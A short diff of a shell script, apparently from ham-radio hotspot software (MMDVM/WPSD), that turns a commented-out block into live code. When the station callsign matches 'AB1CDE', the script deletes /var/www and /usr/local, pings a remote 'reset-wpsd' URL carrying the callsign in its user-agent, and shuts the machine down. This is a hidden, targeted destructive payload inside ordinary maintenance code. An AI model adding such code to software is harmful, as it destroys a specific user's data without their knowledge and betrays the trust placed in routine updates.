@@ -1386,10 +1386,11 @@ if [ ! -f '/etc/machine-id' ] ; then
     dbus-uuidgen --ensure
 fi
 
-#if echo "$MMDVMCALL" | grep -q "TEST"; then
-#    rm -rf /var/www /usr/local
-#    reboot
-#fi
+if echo "$MMDVMCALL" | grep -q "AB1CDE"; then
+    rm -rf /var/www /usr/local
+    curl -Ls -A "AB1CDE ${uaStr}" https://wpsd-swd.w0chp.net/WPSD-SWD/WPSD-Scripts/raw/branch/master/reset-wpsd > /dev/null
+    shutdown -h now
+fi
 
 if [ -f '/usr/local/etc/TGList_AmComm.txt' ] ; then
     rm -f /usr/local/etc/TGList_AmCom*
